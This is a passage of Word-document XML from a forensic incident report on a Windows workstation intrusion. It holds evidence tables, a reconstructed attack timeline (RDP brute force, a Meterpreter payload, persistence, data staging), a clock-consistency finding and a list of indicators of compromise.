              <w:t>SRUM: network usage (end of period)</w:t>
              <w:br/>
              <w:t>TermService</w:t>
              <w:br/>
              <w:t>received=1158782 sent=7120599 IF_TYPE_ETHERNET_CSMACD</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>srumecmd/20261025191812_SrumECmd_NetworkUsages_Output.csv#170</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F:\Windows\System32\SRU\SRUDB.dat</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suricata/case001.pcap/eve_flow.jsonl#29788</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>case001.pcap</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 02:36:23.515604</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Network flows (Suricata)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>network flow: start</w:t>
              <w:br/>
              <w:t>10.42.85.115</w:t>
              <w:br/>
              <w:t>UDP 10.42.85.10:63121 -&gt; 10.42.85.115:3389 failed state=established bytes=283842/6695207</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>suricata/case001.pcap/eve_flow.jsonl#31238</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>case001.pcap</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 04:08:45.483780</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Network flows (Suricata)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>network flow: start</w:t>
              <w:br/>
              <w:t>203.78.103.109</w:t>
              <w:br/>
              <w:t>TCP 10.42.85.115:50972 -&gt; 203.78.103.109:443 failed state=established bytes=39409/488552</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>suricata/case001.pcap/eve_flow.jsonl#16628</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>case001.pcap</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 03:37:35.302000</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>OneDrive (ODL logs)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>OneDrive: log entry</w:t>
              <w:br/>
              <w:t>UX.RequiredSignIn</w:t>
              <w:br/>
              <w:t>EventMachine.cpp EvtMachine::EventMachine::FireEvent UX.RequiredSignIn (SyncEngine-2020-09-19.0337.6904.1.aodl)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>odl/odl_Administrator_Personal.csv#1398</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>4.13 Incident timeline and correlation</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>I rebuilt the incident timeline and checked that the different sources agree on time. Times are UTC; the host is on Pacific time (UTC-7).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>**Attack sequence**</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>1. **Reconnaissance and brute force (03:19, host-equivalent time):** 194.61.24.102 ran an RDP scan and brute force against the Administrator account on the DC (10.42.85.10).</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>2. **DC compromised (03:24):** the DC downloaded coreupdater.exe and opened a Meterpreter session.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>3. **Initial access to the workstation (03:36:22–24):** RDP logon by C137\Administrator (SID -500) coming from the DC.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>4. **Defender disabled (03:39:45–49).**</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>5. **Payload download:**</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">   - 03:39:26: Edge goes to http://194.61.24.102/ (new T-026).</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">   - 03:39:57 → 03:40:00: download and Save-As into Downloads.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">   - 03:40:42: file moved to System32.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>6. **Execution (03:40:49):** coreupdater.exe runs, its Mark-of-the-Web is removed, and the C2 connection to 203.78.103.109:443 starts.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>7. **Interactive commands:** cmd at 03:41:06, then sc.exe and service "coreupdater" at 03:42:42.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>8. **Migration into spoolsv.exe (between 03:40:49 and 03:43:10):** coreupdater (PID 8324) exits at 03:43:10. Memory shows an injected PE (MZ, RWX) in spoolsv.exe PID 2188, which holds the C2 socket and a handle to lsass (new T-027).</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>9. **Privilege escalation (03:43:14):** getsystem service "nehgye".</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>10. **Fileless persistence (03:44:03):** HKLM Run value "coreupdate" plus payload key HKLM\Software\q9Z1bssi.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>11. **Collection and staging (03:45:07–03:51:14):** the attacker browsed user profiles and built the loot.zip archive (03:46:15–03:47:09).</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>12. **Logoff (03:52:13).**</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>13. **Persistence fires (05:08:15–05:08:45):** ricksanchez logs on (type 11/7, new T-028), the Run key launches the PowerShell loader (PID 508→3316) and a second C2 session opens.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>14. **Responder acquisition from 05:08:58.** The C2 connections were still established when the capture ended at 05:38 (host time).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>**Time consistency (F-032)**</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>- The host sources agree to the second: EVTX, $MFT, $J, Prefetch, SRUM and memory.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>- The only clock jump is a VM pause and resume: the clock went from 01:54:39 to 03:13:20 (Kernel-General 1) and was then adjusted slightly by W32Time. There was no backward change during the attack.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>- The pcap timestamps carry a +0200 offset, and the capture clock runs 1 h behind the host. This was confirmed on three pivots, so every pcap time in the timeline table must be read +1 h.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>- No timestomping was found.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>**New IOCs (I-016..I-020)**</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>- the PowerShell loader command line;</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>- the HKLM\Software\q9Z1bssi key;</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>- the Edge partial and cache files;</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>- 10.42.85.10 as an internal pivot host;</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>- the injected region in spoolsv.exe.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>All earlier IOCs are kept (hashes, IPs, URLs, Run value, services, account, archives).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>F-032: Timeline consistency: host clock coherent across EVTX/$MFT/$J/Prefetch/memory; VM resume clock jump 01:54:39→03:13:20; pcap clock ~1 h behind host</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Severity</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="7087"/>
            <w:shd w:val="clear" w:color="auto" w:fill="7F7F7F"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Informational</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
            <w:shd w:val="clear" w:color="auto" w:fill="D9E2F3"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Confidence</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="7087"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>confirmed</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
            <w:shd w:val="clear" w:color="auto" w:fill="D9E2F3"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Independent sources</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="7087"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>evtx:security.evtx</w:t>
              <w:br/>
              <w:t>evtx:system.evtx</w:t>
              <w:br/>
              <w:t>memory</w:t>
              <w:br/>
              <w:t>network</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
            <w:shd w:val="clear" w:color="auto" w:fill="D9E2F3"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Category</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="7087"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>context</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
            <w:shd w:val="clear" w:color="auto" w:fill="D9E2F3"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>MITRE ATT&amp;CK</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="7087"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>n/a</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
            <w:shd w:val="clear" w:color="auto" w:fill="D9E2F3"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Period (UTC)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="7087"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>2020-09-19 01:54:37.447633 → 2020-09-19 03:40:49</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Observed facts</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>(1) Kernel-General 1 at 03:13:20.50 records OldTime 2020-09-19 01:54:39.66 → NewTime 03:13:20.50 (VM suspended/resumed, clock resynchronised; no events exist between 01:54:39 and 03:13:20); micro-adjustments by W32Time at 01:54:37 and 03:13:28 (4616 RecordIDs in Security, Kernel-General 1). No backward clock change during the attack window 03:36–03:52 or at 05:08. (2) Host-side sources agree to the second: coreupdater.exe psscan CreateTime 03:40:49 = Prefetch last run = USN Zone.Identifier StreamChange 03:40:49.317; Run-key PowerShell psscan 05:08:37/05:08:43 = PowerShell 600 05:08:40 ; Registry Run LastWrite 03:44:03. (3) The Suricata eve timestamps carry a +0200 offset (e.g. HTTP GET / raw 04:39:26.94+0200 = 02:39:26.94 UTC) and C2 flow 50875 starts 02:40:49.94 UTC (pcap) while the process starts 03:40:49 host — the capture clock (or its time zone) is 1 h behind the host; all pcap times in the timeline table must be read +1 h. Machine time zone is Pacific (ActiveTimeBias 420 = UTC-7, PDT), so local attack time ≈ 20:36–20:52 on 2020-09-18. (4) No timestomping on attacker artefacts (F-030).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Analysis</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>The host timeline is internally consistent and may be used as reference. The 1 h pcap offset is a sensor clock/TZ artefact (probably a DST mis-configuration on the capture box), not attacker manipulation; correlation was validated on three independent pivots (RDP 4624 vs flow, coreupdater download vs $J, C2 flow vs Prefetch). The 01:54→03:13 gap is a VM pause, explaining the absence of events in that interval; it predates the intrusion on the workstation (first attacker contact with the workstation 03:36:22).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Evidence (6)</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="TableGrid"/>
        <w:tblW w:type="auto" w:w="0"/>
        <w:jc w:val="center"/>
        <w:tblLayout w:type="fixed"/>
        <w:tblLook w:firstColumn="1" w:firstRow="1" w:lastColumn="0" w:lastRow="0" w:noHBand="0" w:noVBand="1" w:val="04A0"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="1474"/>
        <w:gridCol w:w="1474"/>
        <w:gridCol w:w="3628"/>
        <w:gridCol w:w="1701"/>
        <w:gridCol w:w="1701"/>
      </w:tblGrid>
      <w:tr>
        <w:trPr>
          <w:tblHeader w:val="true"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
            <w:shd w:val="clear" w:color="auto" w:fill="1F3864"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>UTC</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
            <w:shd w:val="clear" w:color="auto" w:fill="1F3864"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Artifact</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
            <w:shd w:val="clear" w:color="auto" w:fill="1F3864"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Detail</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
            <w:shd w:val="clear" w:color="auto" w:fill="1F3864"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Reference</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
            <w:shd w:val="clear" w:color="auto" w:fill="1F3864"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Original source</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 03:13:20.501601</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Event logs (EVTX)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>EVTX event</w:t>
              <w:br/>
              <w:t>System 1 | Microsoft-Windows-Kernel-General | The system time was changed | OldTime: 2020-09-19 01:54:39.6645222 | NewTime: 2020-09-19 03:13:20.5000000 | Reason: System time synchronized with the hardware clock.</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#40808</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F:\Windows\System32\winevt\logs\System.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 03:13:28.318873</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2020-09-19 03:13:28.3154393 | NewTime: 2020-09-19 03:13:28.3183014 | LogonId: 0x3E5 | C:\Windows\System32\svchost.exe</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#39496</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F:\Windows\System32\winevt\logs\Security.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 01:54:37.447633</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Event logs (EVTX)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>EVTX event</w:t>
              <w:br/>
              <w:t>C:\Windows\System32\svchost.exe</w:t>
              <w:br/>
              <w:t>Security 4616 | Microsoft-Windows-Security-Auditing | The system time was changed | PreviousTime: 2020-09-19 01:54:37.4418021 | NewTime: 2020-09-19 01:54:37.4469563 | LogonId: 0x3E5 | C:\Windows\System32\svchost.exe</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#39495</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F:\Windows\System32\winevt\logs\Security.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 02:39:26.940438</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>HTTP (Suricata)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>HTTP request</w:t>
